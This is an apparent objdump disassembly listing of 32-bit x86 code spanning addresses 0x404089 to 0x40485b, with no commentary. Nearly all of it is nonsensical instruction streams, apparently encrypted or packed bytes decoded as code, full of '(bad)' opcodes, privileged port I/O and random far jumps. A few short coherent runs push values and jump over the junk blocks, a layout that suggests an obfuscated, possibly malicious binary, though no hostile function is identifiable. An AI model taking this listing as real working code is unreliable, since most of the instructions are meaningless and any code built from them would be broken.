  404089:	add    al,0x4e
  40408b:	jo     0x40405f
  40408d:	xor    bh,ch
  40408f:	sti    
  404090:	pop    ecx
  404091:	push   eax
  404092:	lahf   
  404093:	ins    DWORD PTR es:[edi],dx
  404094:	lahf   
  404095:	retf   0x3c6c
  404098:	fld    TBYTE PTR [edx+0x7336921]
  40409e:	cs enter 0xdb34,0xc3
  4040a3:	(bad)  
  4040a4:	push   edx
  4040a5:	mov    ah,0xb9
  4040a7:	adc    al,0x28
  4040a9:	xchg   ecx,eax
  4040aa:	jge    0x4040f2
  4040ac:	dec    esp
  4040ad:	in     al,dx
  4040ae:	mov    dl,0xea
  4040b0:	lds    esi,FWORD PTR [edi]
  4040b2:	dec    edx
  4040b3:	push   es
  4040b4:	test   DWORD PTR [ebp-0x5b848a49],esi
  4040ba:	mov    ecx,0x70601ae1
  4040bf:	push   esp
  4040c0:	jns    0x4040b7
  4040c2:	in     eax,dx
  4040c3:	pop    es
  4040c4:	(bad)  
  4040c5:	cli    
  4040c6:	ror    dh,0x6b
  4040c9:	scas   al,BYTE PTR es:[edi]
  4040ca:	inc    ebx
  4040cb:	scas   eax,DWORD PTR es:[edi]
  4040cc:	add    dl,bl
  4040ce:	push   edx
  4040cf:	cmp    al,0x7d
  4040d1:	ds ror bh,0xb5
  4040d5:	iret   
  4040d6:	and    al,0x94
  4040d8:	lahf   
  4040d9:	fidivr WORD PTR [edx+0xe]
  4040dc:	mov    edi,0xaf1aa5ae
  4040e1:	daa    
  4040e2:	xor    edi,edx
  4040e4:	les    ebx,FWORD PTR [esp+ebx*8]
  4040e7:	sti    
  4040e8:	mov    eax,DWORD PTR [ecx-0x7261832c]
  4040ee:	dec    esp
  4040ef:	out    0xaf,eax
  4040f1:	and    al,0x2
  4040f3:	jle    0x4040ad
  4040f5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4040f6:	jecxz  0x4040eb
  4040f8:	sub    DWORD PTR [ecx],ecx
  4040fa:	in     eax,0xf5
  4040fc:	inc    edi
  4040fd:	repnz std 
  4040ff:	xor    dl,BYTE PTR [eax]
  404101:	imul   ebx,DWORD PTR [eax-0x80],0xce27cea5
  404108:	mov    al,ds:0x549924c0
  40410d:	(bad)  
  40410e:	fnstcw WORD PTR [edx+0x1a018439]
  404114:	jne    0x4040e2
  404116:	sbb    bl,ah
  404118:	add    ah,dl
  40411a:	mov    bh,BYTE PTR [ecx]
  40411c:	sbb    BYTE PTR [edi-0x1f],bl
  40411f:	fwait
  404120:	jg     0x404104
  404122:	push   esi
  404123:	pop    ecx
  404124:	lea    esi,[ecx-0x13fc3db7]
  40412a:	mov    edi,0x79b0ee5d
  40412f:	shr    DWORD PTR [eax-0x580d747b],1
  404135:	inc    edi
  404136:	push   esp
  404137:	sti    
  404138:	outs   dx,DWORD PTR ds:[esi]
  404139:	jbe    0x4040d0
  40413b:	dec    esi
  40413c:	dec    ecx
  40413d:	jge    0x404168
  40413f:	cmp    BYTE PTR [ebx+esi*4],ah
  404142:	lock cmc 
  404144:	sub    esi,DWORD PTR [esi+0x1b]
  404147:	sbb    BYTE PTR [ebp+0x4],dl
  40414a:	dec    ecx
  40414b:	in     al,0xfc
  40414d:	jae    0x4040f0
  40414f:	clc    
  404150:	fs je  0x404118
  404153:	popa   
  404154:	fucom  st(0)
  404156:	aaa    
  404157:	xor    al,0x44
  404159:	in     al,dx
  40415a:	pop    ecx
  40415b:	outs   dx,BYTE PTR ds:[esi]
  40415c:	fisttp DWORD PTR [eax]
  40415e:	sub    DWORD PTR [edx+0x6e112ea9],eax
  404164:	out    0x80,al
  404166:	(bad)  
  404168:	test   ah,bh
  40416a:	add    DWORD PTR [edx+0x52b5d79],eax
  404170:	add    BYTE PTR [eax-0x5c69cedc],bl
  404176:	mov    ds:0xe88bf1b,eax
  40417b:	sub    al,0x46
  40417d:	add    al,0xfd
  40417f:	in     al,dx
  404180:	int3   
  404181:	ins    DWORD PTR es:[edi],dx
  404182:	adc    cl,0x8d
  404185:	popf   
  404186:	js     0x4041f8
  404188:	mov    WORD PTR ss:[esi-0x7d],ds
  40418c:	daa    
  40418d:	inc    ebx
  40418e:	hlt    
  40418f:	adc    al,0x90
  404191:	sbb    DWORD PTR ds:0x8de7ed16,ecx
  404197:	xor    al,0x3c
  404199:	push   0xffffffb1
  40419b:	imul   ebp,ebx,0x3a
  40419e:	mov    ebp,0x69fa585d
  4041a3:	neg    DWORD PTR [ebx-0x23]
  4041a6:	(bad)  
  4041a7:	in     eax,0xca
  4041a9:	ror    bh,cl
  4041ab:	cdq    
  4041ac:	fsub   QWORD PTR [edx]
  4041ae:	add    esp,DWORD PTR [eax+0x149422b5]
  4041b4:	ins    BYTE PTR es:[edi],dx
  4041b5:	jp     0x4041f8
  4041b7:	hlt    
  4041b8:	xchg   ecx,eax
  4041b9:	(bad)  
  4041ba:	pop    eax
  4041bb:	adc    BYTE PTR [ebx-0x469b7980],ah
  4041c1:	sub    BYTE PTR [esi],bl
  4041c3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4041c4:	pop    esi
  4041c5:	mov    cl,0x51
  4041c7:	mov    ds:0x12e21d26,eax
  4041cc:	sub    al,0x6e
  4041ce:	push   eax
  4041cf:	add    DWORD PTR [edx+ebx*8+0x9],edi
  4041d3:	jle    0x40420a
  4041d5:	in     al,0xea
  4041d7:	fwait
  4041d8:	inc    ecx
  4041d9:	pop    eax
  4041da:	xchg   esp,eax
  4041db:	aas    
  4041dc:	sbb    bh,BYTE PTR [esi-0x715496c0]
  4041e2:	in     al,0xd0
  4041e4:	call   0x5ff4dfdf
  4041e9:	loop   0x4041af
  4041eb:	sbb    ah,BYTE PTR [edx-0x5a]
  4041ee:	not    DWORD PTR [edx+0x7ad2d7a8]
  4041f4:	call   FWORD PTR [edx]
  4041f6:	outs   dx,DWORD PTR ds:[esi]
  4041f7:	imul   DWORD PTR [edx-0xe749408]
  4041fd:	mov    BYTE PTR ds:0x822febc9,cl
  404203:	xchg   edx,eax
  404204:	jecxz  0x404265
  404206:	lds    esi,FWORD PTR [eax]
  404208:	push   0xb
  40420a:	gs xchg edx,eax
  40420c:	push   cs
  40420d:	xchg   BYTE PTR [esi+0xafed187],ah
  404213:	push   DWORD PTR [ebp-0x18]
  404216:	mov    eax,ds:0x413c9a
  40421b:	mov    eax,DWORD PTR [eax]
  40421d:	push   DWORD PTR [eax]
  40421f:	lea    eax,ds:0x413cb6
  404225:	push   DWORD PTR [eax]
  404227:	lea    eax,ds:0x413a62
  40422d:	push   DWORD PTR [eax]
  40422f:	lea    eax,ds:0x413c96
  404235:	jmp    0x404643
  40423a:	out    0xed,eax
  40423c:	sahf   
  40423d:	(bad)  
  40423e:	mov    ah,0x55
  404240:	addr16 in eax,dx
  404242:	push   edi
  404243:	sub    DWORD PTR [bx+si+0x42],0xffffffb1
  404248:	mov    ds:0x7e25d533,eax
  40424d:	jle    0x4042be
  40424f:	jge    0x4042cf
  404251:	jle    0x404247
  404253:	mov    BYTE PTR [ecx-0x63],0x87
  404257:	test   eax,edx
  404259:	mov    cl,0x92
  40425b:	test   DWORD PTR [esi+0x68],eax
  40425e:	mov    eax,ds:0xdf1a3ebb
  404263:	out    0xdc,al
  404265:	(bad)  
  404266:	or     esi,ebx
  404268:	mov    ebx,eax
  40426a:	push   es
  40426b:	add    DWORD PTR [edi+0x47],0x65326731
  404272:	sub    BYTE PTR [ebx],cl
  404274:	arpl   di,sp
  404276:	or     eax,0xa2f9cb28
  40427b:	addr16 xchg edi,eax
  40427d:	add    DWORD PTR [edi-0x1d],ecx
  404280:	lock pop ecx
  404282:	mov    cl,0xa7
  404284:	push   cs
  404285:	stos   DWORD PTR es:[edi],eax
  404286:	pop    eax
  404287:	ss sbb eax,0xe33a5231
  40428d:	fwait
  40428e:	mov    dh,0xd6
  404290:	sub    eax,0x8085ccf9
  404295:	ret    0x5108
  404298:	icebp  
  404299:	push   es
  40429a:	push   ebx
  40429b:	pop    esp
  40429c:	mov    dh,0x90
  40429e:	lods   eax,DWORD PTR ds:[esi]
  40429f:	add    ebx,DWORD PTR ds:0x26e61150
  4042a5:	jge    0x4042fc
  4042a7:	out    0x62,al
  4042a9:	push   0xc3a9af12
  4042ae:	xor    eax,0x9d08a235
  4042b3:	sub    eax,0xea091e8b
  4042b8:	adc    BYTE PTR cs:[ebp+0x6f68c7d5],bl
  4042bf:	scas   eax,DWORD PTR es:[edi]
  4042c0:	xor    al,0xd2
  4042c2:	sub    DWORD PTR [eax+edx*4-0x51],esp
  4042c6:	xor    al,0x89
  4042c8:	pop    edx
  4042c9:	out    0x7d,eax
  4042cb:	in     al,dx
  4042cc:	dec    esi
  4042cd:	inc    ebp
  4042ce:	clc    
  4042cf:	sbb    BYTE PTR [edx-0x7bd97ccc],bl
  4042d5:	js     0x404308
  4042d7:	adc    ebp,ebx
  4042d9:	push   0xffffff81
  4042db:	leave  
  4042dc:	sbb    DWORD PTR [ecx-0x74],eax
  4042df:	popa   
  4042e0:	in     al,dx
  4042e1:	pop    ecx
  4042e2:	jbe    0x4042f3
  4042e4:	xchg   edx,eax
  4042e5:	sub    BYTE PTR [edi+edx*2-0xe525907],al
  4042ec:	pop    esi
  4042ed:	mov    bh,0xd1
  4042ef:	push   ds
  4042f0:	sub    BYTE PTR [esi+edx*1+0x6cc5620],0x61
  4042f8:	sbb    al,0x8b
  4042fa:	idiv   DWORD PTR [eax-0x3a8d98ab]
  404300:	cmp    ah,al
  404302:	ror    BYTE PTR [edx+0x4ab0af2],0xfc
  404309:	push   0x24
  40430b:	sbb    BYTE PTR [ebx+0x1cede374],dh
  404311:	mov    esp,es
  404313:	and    BYTE PTR [eax],0xb0
  404316:	shl    BYTE PTR [ebx],0x3a
  404319:	jecxz  0x404378
  40431b:	add    BYTE PTR [edx+0x5e],dh
  40431e:	rol    BYTE PTR [ebp-0x41cf184d],0xd2
  404325:	sub    eax,0x13583112
  40432a:	imul   bp,WORD PTR [edx+0x552c52e2],0xffa9
  404332:	mov    bh,0x42
  404334:	mov    edi,0x12a43b0b
  404339:	(bad)  
  40433a:	push   ebp
  40433b:	inc    ecx
  40433c:	es in  al,0x3c
  40433f:	cmp    eax,0x11682f11
  404344:	inc    edi
  404345:	fisub  DWORD PTR ds:0x3f2ae21e
  40434b:	loope  0x4042ea
  40434d:	nop
  40434e:	pop    edx
  40434f:	mov    esp,0xc30d3b15
  404354:	jbe    0x404317
  404356:	dec    edi
  404357:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404358:	adc    BYTE PTR [ecx-0x20827e45],ch
  40435e:	mov    edx,DWORD PTR [edx]
  404360:	fidiv  DWORD PTR [esi-0x54]
  404363:	add    eax,0x59bed107
  404368:	lahf   
  404369:	in     al,0x0
  40436b:	loope  0x404361
  40436d:	mov    ds:0x785def36,eax
  404372:	fsubr  DWORD PTR [eax]
  404374:	outs   dx,DWORD PTR ds:[esi]
  404375:	daa    
  404376:	pop    edx
  404377:	jmp    0x404384
  404379:	mov    eax,ds:0x800a8a34
  40437e:	(bad)  
  40437f:	fs mov ?,WORD PTR ss:[edx-0x5848f060]
  404387:	imul   ebx,DWORD PTR [ebp-0x7c],0x5c
  40438b:	cmp    BYTE PTR [esi],0xa2
  40438e:	cdq    
  40438f:	xchg   edi,eax
  404390:	mov    dl,0xb
  404392:	xor    ecx,esi
  404394:	lahf   
  404395:	and    eax,0xaa7fdfe6
  40439a:	or     ebp,DWORD PTR [ecx+0x60]
  40439d:	mov    dh,0xe6
  40439f:	or     al,0x1f
  4043a1:	or     ah,BYTE PTR [edx]
  4043a3:	ins    BYTE PTR es:[edi],dx
  4043a4:	push   cs
  4043a5:	into   
  4043a6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4043a7:	hlt    
  4043a8:	fbld   TBYTE PTR [esi]
  4043aa:	mov    edi,0x71c0813a
  4043af:	mov    ch,0xe8
  4043b1:	add    al,0xc3
  4043b3:	dec    BYTE PTR [edx+0x19ee99bf]
  4043b9:	fmul   st(4),st
  4043bb:	mov    edx,0xeecd5d9d
  4043c0:	std    
  4043c1:	push   ebp
  4043c2:	aas    
  4043c3:	fimul  DWORD PTR ds:0x7fe6f4cd
  4043c9:	or     BYTE PTR [edi+0x6a],cl
  4043cc:	js     0x40439d
  4043ce:	push   edi
  4043cf:	adc    eax,0xccfcd296
  4043d4:	xchg   ebp,eax
  4043d5:	pop    edi
  4043d6:	add    al,0x5
  4043d8:	cli    
  4043d9:	cs jg  0x40442a
  4043dc:	jg     0x404366
  4043de:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4043df:	pop    esp
  4043e0:	cmc    
  4043e1:	pop    eax
  4043e2:	clc    
  4043e3:	cld    
  4043e4:	pop    esi
  4043e5:	ja     0x404431
  4043e7:	adc    BYTE PTR [ecx+0x6705d499],dh
  4043ed:	popa   
  4043ee:	je     0x404415
  4043f0:	dec    esp
  4043f1:	jns    0x4043e8
  4043f3:	out    dx,eax
  4043f4:	inc    ecx
  4043f5:	inc    ecx
  4043f6:	dec    ebx
  4043f7:	push   esp
  4043f8:	mov    ecx,DWORD PTR [esp+ecx*2+0x16fd240f]
  4043ff:	mov    DWORD PTR [ebp-0x4c],edx
  404402:	setl   BYTE PTR [ecx-0x45]
  404406:	dec    ecx
  404407:	push   esp
  404408:	les    esi,FWORD PTR ds:0x79d0de4f
  40440e:	jmp    0xfa9e:0x5959042b
  404415:	aaa    
  404416:	xchg   edi,edi
  404418:	nop
  404419:	retf   
  40441a:	stos   BYTE PTR es:[edi],al
  40441b:	xchg   BYTE PTR ds:0x18d85f7e,ch
  404421:	out    0x39,eax
  404423:	retf   0x92c0
  404426:	mov    eax,ds:0x8af24480
  40442b:	add    al,0xbf
  40442d:	leave  
  40442e:	inc    ebp
  40442f:	mov    ebp,0x3b66dd06
  404434:	or     esi,DWORD PTR [ecx-0x35fedce0]
  40443a:	and    ebx,DWORD PTR [ecx+0x1b]
  40443d:	das    
  40443e:	add    bh,al
  404440:	dec    ebx
  404441:	inc    edi
  404442:	cmp    eax,0x4f559b94
  404447:	ins    DWORD PTR es:[edi],dx
  404448:	pop    edx
  404449:	je     0x4044bc
  40444b:	pop    ebp
  40444c:	loop   0x404484
  40444e:	fdiv   DWORD PTR [eax]
  404450:	and    ebp,DWORD PTR [ebx]
  404452:	mov    edx,0x8b1d09e7
  404457:	dec    edi
  404458:	arpl   WORD PTR [edi+0x1467df5],cx
  40445e:	xlat   BYTE PTR ds:[ebx]
  40445f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404460:	sbb    eax,DWORD PTR [edi]
  404462:	pusha  
  404463:	out    dx,al
  404464:	xchg   ebp,eax
  404465:	jecxz  0x404408
  404467:	cmp    BYTE PTR [eax],0xe4
  40446a:	xor    DWORD PTR [ebp+0x1338406],ecx
  404470:	or     eax,0x3fbc7fd6
  404475:	adc    cl,dl
  404477:	fcomp  st(5)
  404479:	or     BYTE PTR ds:0x5cb3d6c7,cl
  40447f:	mov    cl,0x8f
  404481:	jb     0x4044ba
  404483:	out    0x5e,eax
  404485:	dec    eax
  404486:	mov    dh,0xf7
  404488:	aas    
  404489:	pusha  
  40448a:	test   DWORD PTR es:[ebx-0x21cdfc76],ecx
  404491:	mov    ds:0xaae5b275,al
  404496:	inc    eax
  404497:	aad    0xfc
  404499:	dec    eax
  40449a:	arpl   WORD PTR [esi-0x354703d5],sp
  4044a0:	pop    ebx
  4044a1:	lahf   
  4044a2:	xor    eax,0x26311924
  4044a7:	pop    ecx
  4044a8:	(bad)  
  4044a9:	ss mov dl,0x1b
  4044ac:	lods   eax,DWORD PTR ds:[esi]
  4044ad:	inc    edx
  4044ae:	jmp    0x4044bd
  4044b0:	push   edx
  4044b1:	pop    ecx
  4044b2:	cdq    
  4044b3:	shl    BYTE PTR [esi+0x73],0x2d
  4044b7:	std    
  4044b8:	fst    QWORD PTR ss:[eax+0x6f2da4ee]
  4044bf:	sbb    BYTE PTR [eax+eiz*8],al
  4044c2:	call   0xbde0:0xbc12da45
  4044c9:	dec    edx
  4044ca:	repz imul ecx,DWORD PTR [esi+0xc],0xffffffbb
  4044cf:	xor    dl,cl
  4044d1:	adc    DWORD PTR [edi],edi
  4044d3:	(bad)  
  4044d4:	cmc    
  4044d5:	and    eax,0x60e1c013
  4044da:	shl    DWORD PTR [edx],cl
  4044dc:	mov    esp,0xb1c48ca6
  4044e1:	pop    ss
  4044e2:	retf   
  4044e3:	xlat   BYTE PTR ds:[ebx]
  4044e4:	iret   
  4044e5:	or     eax,0x8d382bfc
  4044ea:	cmc    
  4044eb:	pop    ebp
  4044ec:	sub    BYTE PTR [ebx+ecx*8-0xbe50445],dl
  4044f3:	arpl   WORD PTR [eax-0x2fa1db9f],si
  4044f9:	xor    cl,al
  4044fb:	pop    DWORD PTR [edi-0x34]
  4044fe:	sub    al,0x6
  404500:	mov    ds:0xc4e2bfc3,al
  404505:	cmp    dh,BYTE PTR [ebp+0x7a3722e4]
  40450b:	out    dx,al
  40450c:	push   ebx
  40450d:	icebp  
  40450e:	push   cs
  40450f:	sub    eax,0xd040d55c
  404514:	mov    ds:0xbe0fbb4c,al
  404519:	xchg   esp,eax
  40451a:	inc    esp
  40451b:	xor    eax,DWORD PTR ds:0x95a7a857
  404521:	or     eax,0x8401a7d9
  404526:	xlat   BYTE PTR ds:[ebx]
  404527:	leave  
  404528:	jl     0x4044b3
  40452a:	test   DWORD PTR [edi-0x12],ecx
  40452d:	adc    ebx,edi
  40452f:	jmp    0x4044f0
  404531:	nop
  404532:	push   es
  404533:	and    ecx,edx
  404535:	pusha  
  404536:	addr16 mov ebx,0x9833db55
  40453c:	pop    esi
  40453d:	outs   dx,BYTE PTR ds:[esi]
  40453e:	pop    esp
  40453f:	mov    ah,0x24
  404541:	mov    ebx,0xb707682c
  404546:	scas   al,BYTE PTR es:[edi]
  404547:	hlt    
  404548:	(bad)  
  404549:	sbb    eax,DWORD PTR [edx]
  40454b:	mov    edi,0xc7932e2e
  404550:	sbb    bl,BYTE PTR [ebx+0x70]
  404553:	test   ecx,edx
  404555:	sub    ecx,ecx
  404557:	adc    al,0xe1
  404559:	outs   dx,BYTE PTR ds:[esi]
  40455a:	(bad)  
  40455b:	aas    
  40455c:	in     eax,0x9a
  40455e:	pop    es
  40455f:	push   0xa
  404561:	and    dl,BYTE PTR [edx+0x3db2a962]
  404567:	jg     0x4044ee
  404569:	sbb    BYTE PTR [ebx],bl
  40456b:	add    al,0xa1
  40456d:	enter  0xab54,0x7
  404571:	sahf   
  404572:	dec    ecx
  404573:	or     BYTE PTR [edi+0x3c],0xec
  404577:	xchg   BYTE PTR [esi],al
  404579:	sbb    bl,BYTE PTR [edi]
  40457b:	data16 and cl,BYTE PTR [eax]
  40457e:	jne    0x40458e
  404580:	lods   eax,DWORD PTR ds:[esi]
  404581:	and    DWORD PTR [edx-0x2],0x595306e4
  404588:	das    
  404589:	pop    ds
  40458a:	leave  
  40458b:	test   eax,0x4791d70
  404590:	push   ecx
  404591:	inc    BYTE PTR [edx+0x268a7ed6]
  404597:	jbe    0x4045ec
  404599:	inc    edx
  40459a:	jnp    0x40458e
  40459c:	jno    0x4045b8
  40459e:	rol    DWORD PTR [esi+0x14a65a43],1
  4045a4:	retf   0x5fb3
  4045a7:	mov    gs,WORD PTR [esi+0x158ce2a1]
  4045ad:	bound  ecx,QWORD PTR [eax-0x12]
  4045b0:	and    al,0x26
  4045b2:	aaa    
  4045b3:	into   
  4045b4:	in     eax,dx
  4045b5:	add    esi,ebp
  4045b7:	cmp    BYTE PTR ds:0xcf45636,0x4b
  4045be:	pop    edi
  4045bf:	shl    BYTE PTR [ebp+0x1630126f],0x42
  4045c6:	xor    bh,BYTE PTR [edi]
  4045c8:	std    
  4045c9:	inc    ebx
  4045ca:	mov    DWORD PTR [esi+edx*1],edx
  4045cd:	xchg   edx,eax
  4045ce:	sub    ah,BYTE PTR [edx]
  4045d0:	ficomp WORD PTR [ecx-0x38]
  4045d3:	dec    edx
  4045d4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4045d5:	sbb    DWORD PTR [ecx+0x79bca9d2],0xffffffcf
  4045dc:	push   0x7b532a60
  4045e1:	push   ebx
  4045e2:	(bad)  
  4045e3:	repnz cmc 
  4045e5:	jp     0x4045d0
  4045e7:	fist   DWORD PTR [ebx-0x45bf5de0]
  4045ed:	adc    BYTE PTR [edx],bl
  4045ef:	imul   edx,DWORD PTR [eax+eiz*1-0x670ef95a],0x7d
  4045f7:	rcr    DWORD PTR [ebp+0x57d62125],cl
  4045fd:	in     eax,dx
  4045fe:	cmp    DWORD PTR [ebx+0x609eb7c7],esi
  404604:	fs out 0x40,al
  404607:	dec    esp
  404608:	xor    ebp,esi
  40460a:	dec    eax
  40460b:	addr16 sub al,0xdc
  40460e:	outs   dx,DWORD PTR ds:[esi]
  40460f:	adc    DWORD PTR [ebp+0x48],ebx
  404612:	retf   0x68ca
  404615:	sub    cl,ch
  404617:	pop    eax
  404618:	gs repz es cdq 
  40461c:	mov    WORD PTR [edi-0x26],cs
  40461f:	cmc    
  404620:	or     dh,BYTE PTR [ecx+0x7f]
  404623:	add    edi,DWORD PTR [eax-0x3d]
  404626:	mov    ah,0x42
  404628:	lds    edx,FWORD PTR [ecx]
  40462a:	add    esp,DWORD PTR [edi]
  40462c:	add    BYTE PTR [eax-0x3c86214e],0xcd
  404633:	inc    esi
  404634:	gs jns 0x4046a0
  404637:	add    DWORD PTR cs:[ecx+0x46],ebx
  40463b:	aam    0x3d
  40463d:	rcr    bl,cl
  40463f:	cmp    BYTE PTR [edx-0x18],ah
  404642:	pop    ecx
  404643:	push   DWORD PTR [eax]
  404645:	lea    eax,ds:0x413dc2
  40464b:	push   DWORD PTR [eax]
  40464d:	xchg   ebx,edx
  40464f:	inc    ebx
  404650:	inc    ebx
  404651:	push   ebx
  404652:	pop    eax
  404653:	call   DWORD PTR [eax-0x2]
  404656:	mov    eax,DWORD PTR [ebp-0x38]
  404659:	mov    ecx,DWORD PTR ds:0x413c5a
  40465f:	add    DWORD PTR [eax],ecx
  404661:	jmp    0x404a6f
  404666:	xor    DWORD PTR ds:0xb112a30a,ebx
  40466c:	mov    cl,0xad
  40466e:	jne    0x404697
  404670:	xor    eax,0xaa9c7de3
  404675:	or     dl,al
  404677:	and    DWORD PTR [esi+0x7e],edi
  40467a:	outs   dx,DWORD PTR ds:[esi]
  40467b:	jge    0x4046fb
  40467d:	jle    0x404670
  40467f:	fstp   TBYTE PTR [ebx+ebp*4+0x5c751d62]
  404686:	xor    DWORD PTR [eax-0x7e],esp
  404689:	mov    cl,0xf6
  40468b:	push   ss
  40468c:	jnp    0x404700
  40468e:	mov    edx,0x305c19d1
  404693:	jl     0x404676
  404695:	jle    0x4046df
  404697:	cmp    edx,eax
  404699:	push   ecx
  40469a:	pushw  ss
  40469c:	cmp    ch,BYTE PTR [edx]
  40469e:	adc    bh,BYTE PTR [edx]
  4046a0:	push   bp
  4046a2:	imul   ebp,DWORD PTR [eax-0x5d],0xffffff90
  4046a6:	sahf   
  4046a7:	jecxz  0x4046a4
  4046a9:	inc    esi
  4046aa:	jno    0x4046df
  4046ac:	ret    0x1018
  4046af:	push   eax
  4046b0:	pop    eax
  4046b1:	imul   ebx,DWORD PTR [eax],0xfec0ec6e
  4046b7:	shl    DWORD PTR [edi],1
  4046b9:	inc    edx
  4046ba:	repz test al,0x92
  4046bd:	xchg   ecx,eax
  4046be:	pop    esp
  4046bf:	push   0x4
  4046c1:	sbb    al,0xe0
  4046c3:	mov    eax,0xe9da85d8
  4046c8:	(bad)  
  4046c9:	jecxz  0x404650
  4046cb:	pop    ds
  4046cc:	sub    al,BYTE PTR ds:0x2d281dd4
  4046d2:	cwde   
  4046d3:	stos   BYTE PTR es:[edi],al
  4046d4:	xchg   esp,eax
  4046d5:	jp     0x4046da
  4046d7:	aaa    
  4046d8:	add    ch,bh
  4046da:	clc    
  4046db:	xor    BYTE PTR [ecx+esi*8+0x27],0xec
  4046e0:	dec    eax
  4046e1:	add    dh,BYTE PTR [eax]
  4046e3:	adc    esi,DWORD PTR [ebp-0x233a7c88]
  4046e9:	(bad)  
  4046ea:	mov    eax,DWORD PTR [esi-0x74]
  4046ed:	ins    DWORD PTR es:[edi],dx
  4046ee:	sub    bl,BYTE PTR [ebp+0x7d]
  4046f1:	loope  0x404756
  4046f3:	inc    ebp
  4046f4:	push   ecx
  4046f5:	sub    eax,0xd2de39f
  4046fa:	(bad)  
  4046fb:	rol    DWORD PTR [esi],1
  4046fd:	and    dl,bh
  4046ff:	rcl    edx,0x83
  404702:	js     0x4046ee
  404704:	add    esi,ebp
  404706:	pop    ebx
  404707:	(bad)  
  404708:	mov    BYTE PTR [ecx],bh
  40470a:	in     eax,dx
  40470b:	dec    ebp
  40470c:	out    dx,al
  40470d:	adc    BYTE PTR [esi-0x2a45ed0c],bl
  404713:	add    DWORD PTR [ebx],esi
  404715:	or     edi,DWORD PTR [edx+eiz*8]
  404718:	aam    0x55
  40471a:	jg     0x4046b1
  40471c:	inc    eax
  40471d:	xchg   ebx,eax
  40471e:	adc    eax,0xb2cbb3e4
  404723:	jns    0x404741
  404725:	dec    BYTE PTR [edi-0x75093615]
  40472b:	jg     0x40470b
  40472d:	dec    edi
  40472e:	fs mov dl,0x15
  404731:	aad    0x55
  404733:	inc    ecx
  404734:	inc    ebx
  404735:	imul   ebx,eax,0x4b
  404738:	cdq    
  404739:	dec    esp
  40473a:	fsub   QWORD PTR [ebx]
  40473c:	repnz mov bh,0x74
  40473f:	aam    0xa3
  404741:	mov    gs,WORD PTR [eax]
  404743:	add    dl,cl
  404745:	mov    eax,0x9c11e9b6
  40474a:	test   BYTE PTR [ebp+0x20fa0d4],al
  404750:	retf   
  404751:	add    bl,BYTE PTR [edx-0x149c3ca1]
  404757:	xchg   esi,eax
  404758:	adc    dh,cl
  40475a:	repz retf 
  40475c:	(bad)  
  40475d:	cmp    eax,0x6ffa73a4
  404762:	mov    eax,0x55b095c1
  404767:	in     al,dx
  404768:	sbb    cl,BYTE PTR [ecx+0x756a7584]
  40476e:	(bad)  
  40476f:	je     0x4047b4
  404771:	sbb    esp,DWORD PTR ds:0x8ffaf693
  404777:	inc    dl
  404779:	loop   0x404756
  40477b:	mov    es,WORD PTR [edx]
  40477d:	je     0x4047d4
  40477f:	shl    DWORD PTR [ecx+eax*4+0x54509459],1
  404786:	aam    0x86
  404788:	mov    bh,0xee
  40478a:	mov    dl,0x50
  40478c:	jno    0x4047dc
  40478e:	push   ebp
  40478f:	mov    bl,0x9b
  404791:	cmp    al,0xf
  404793:	inc    ecx
  404794:	xlat   BYTE PTR ds:[ebx]
  404795:	arpl   WORD PTR [esi-0x2d6adecd],di
  40479b:	cmp    eax,0xe1d6f9cb
  4047a0:	js     0x4047d7
  4047a2:	sahf   
  4047a3:	xchg   ebp,eax
  4047a4:	or     BYTE PTR [eax],ch
  4047a6:	cwde   
  4047a7:	outs   dx,DWORD PTR ds:[esi]
  4047a8:	in     al,dx
  4047a9:	inc    edi
  4047aa:	dec    ebp
  4047ab:	or     BYTE PTR [ebp+0x2c45aebe],ah
  4047b1:	fcom   DWORD PTR [ebx-0x39]
  4047b4:	sbb    esi,DWORD PTR ds:0xa94340cf
  4047ba:	pop    ds
  4047bb:	aaa    
  4047bc:	(bad)  
  4047bd:	aaa    
  4047be:	dec    ebp
  4047bf:	pop    es
  4047c0:	jns    0x404773
  4047c2:	idiv   DWORD PTR [ecx+0x61]
  4047c5:	dec    esp
  4047c6:	fistp  WORD PTR [esi-0x5311f737]
  4047cc:	jae    0x4047fc
  4047ce:	ret    
  4047cf:	imul   edx,DWORD PTR [ebp-0x5e63a4d],0x2e54366f
  4047d9:	inc    eax
  4047da:	sti    
  4047db:	xchg   ah,al
  4047dd:	pushf  
  4047de:	loop   0x4047d7
  4047e0:	dec    esp
  4047e1:	mov    BYTE PTR [eax+0x18],dl
  4047e4:	imul   edx,DWORD PTR [edi-0x49],0x7
  4047e8:	arpl   WORD PTR es:[edi-0x33],si
  4047ec:	adc    dl,0x38
  4047ef:	mov    ds:0x99e42d36,eax
  4047f4:	mov    edx,0xa6a1fa72
  4047f9:	imul   ecx,DWORD PTR [edi],0x33
  4047fc:	mov    ebp,DWORD PTR [eax]
  4047fe:	pop    ss
  4047ff:	inc    esi
  404800:	cmp    BYTE PTR [ecx],ch
  404802:	repz test BYTE PTR [eax-0x31],0xd9
  404807:	adc    dh,dh
  404809:	in     eax,dx
  40480a:	sub    cl,ch
  40480c:	dec    esp
  40480d:	mov    gs,WORD PTR [edi]
  40480f:	jmp    0x565fd377
  404814:	cmp    ebx,0x5fd33b66
  40481a:	and    eax,0xbe28833
  40481f:	jge    0x404858
  404821:	or     bl,BYTE PTR [ecx]
  404823:	mov    ds:0xa0df5f4d,al
  404828:	adc    BYTE PTR [eax-0x33],bl
  40482b:	icebp  
  40482c:	sub    ch,BYTE PTR [esi]
  40482e:	mov    eax,ds:0x1ccc575a
  404833:	cmp    al,0xb1
  404835:	push   ecx
  404836:	push   cs
  404837:	jle    0x404841
  404839:	into   
  40483a:	cwde   
  40483b:	push   cs
  40483c:	fsubr  st,st(1)
  40483e:	aas    
  40483f:	data16 adc dh,BYTE PTR [ebx+esi*2-0x33452ab7]
  404847:	ss pop eax
  404849:	sahf   
  40484a:	xchg   cl,dh
  40484c:	(bad)  
  40484d:	jno    0x40489e
  40484f:	lds    edx,FWORD PTR [edx]
  404851:	pop    edi
  404852:	inc    ebp
  404853:	rcr    BYTE PTR [esi-0x31a2cd1f],cl
  404859:	les    edx,FWORD PTR [esi]
  40485b:	mov    bh,0x2
